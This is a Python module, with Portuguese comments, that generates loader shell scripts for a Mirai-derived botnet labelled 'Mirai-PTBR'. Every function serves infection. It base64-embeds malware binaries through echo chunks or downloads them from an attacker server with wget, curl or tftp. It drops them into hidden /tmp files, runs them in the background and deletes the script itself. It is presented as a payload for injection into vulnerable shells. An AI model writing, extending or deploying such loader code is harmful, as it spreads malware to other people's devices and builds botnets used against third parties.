import os
import base64
import hashlib
import logging

log = logging.getLogger(__name__)


def get_binary_path(arch: str, binary_dir: str = "bins") -> str:
    """Retorna caminho do binário para uma arquitetura."""
    # Tenta várias extensões
    candidates = [
        os.path.join(binary_dir, arch),
        os.path.join(binary_dir, f"{arch}.bin"),
        os.path.join(binary_dir, f"{arch}.elf"),
    ]

    for path in candidates:
        if os.path.exists(path):
            return path

    return candidates[0]


def load_binary_b64(arch: str, binary_dir: str = "bins") -> str:
    """Carrega binário e retorna como string base64."""
    path = get_binary_path(arch, binary_dir)
    if not os.path.exists(path):
        log.warning(f"Binário não encontrado para arch {arch}: {path}")
        return ""

    with open(path, 'rb') as f:
        data = f.read()

    log.info(f"Carregado binário {path}: {len(data)} bytes")
    return base64.b64encode(data).decode('ascii')


def build_echoload_payload(arch: str, binary_dir: str = "bins") -> str:
    """
    Constrói payload shell script que reconstrói o binário via echo.
    Útil para injetar diretamente em shells vulneráveis.
    """
    b64_data = load_binary_b64(arch, binary_dir)
    if not b64_data:
        return ""

    chunks = [b64_data[i:i+500] for i in range(0, len(b64_data), 500)]

    lines = []
    lines.append('#!/bin/sh')
    lines.append(f'# Mirai-PTBR loader payload for {arch}')
    lines.append(f'# Size: {len(b64_data)} bytes base64')

    # Caminho temporário ofuscado
    import random
    import string
    name = ''.join(random.choices(string.ascii_lowercase, k=6))
    path = f'/tmp/.{name}'

    # Escreve base64 em chunks
    for i, chunk in enumerate(chunks):
        if i == 0:
            lines.append(f'echo -n "{chunk}" > {path}.b64')
        else:
            lines.append(f'echo -n "{chunk}" >> {path}.b64')

    # Decodifica
    lines.append(f'base64 -d < {path}.b64 > {path} 2>/dev/null || \\')
    lines.append(f'  busybox base64 -d < {path}.b64 > {path} 2>/dev/null || \\')
    lines.append(f'  openssl enc -base64 -d < {path}.b64 > {path}')
    lines.append(f'chmod +x {path}')
    lines.append(f'rm {path}.b64')
    lines.append(f'{path} 2>/dev/null &')
    lines.append(f'rm -f $0')  # Auto-delete do script

    return '\n'.join(lines)


def build_wget_payload(arch: str, server_ip: str, http_port: int = 8080) -> str:
    """Constrói payload shell script que baixa e executa via wget."""
    url = f"http://{server_ip}:{http_port}/{arch}"

    import random
    import string
    name = ''.join(random.choices(string.ascii_lowercase, k=6))
    path = f'/tmp/.{name}'

    script = f"""#!/bin/sh
wget -q -O {path} {url} || curl -so {path} {url}
chmod +x {path}
{path} 2>/dev/null &
rm -f $0
"""
    return script


def build_tftp_payload(arch: str, server_ip: str, tftp_port: int = 69) -> str:
    """Constrói payload shell script que baixa e executa via TFTP."""
    binary_name = arch

    import random
    import string
    name = ''.join(random.choices(string.ascii_lowercase, k=6))
    path = f'/tmp/.{name}'

    script = f"""#!/bin/sh
tftp -g -r {binary_name} -l {path} {server_ip} 2>/dev/null || \\
busybox tftp -g -r {binary_name} -l {path} {server_ip} 2>/dev/null
chmod +x {path}
{path} 2>/dev/null &
rm -f $0
"""
    return script
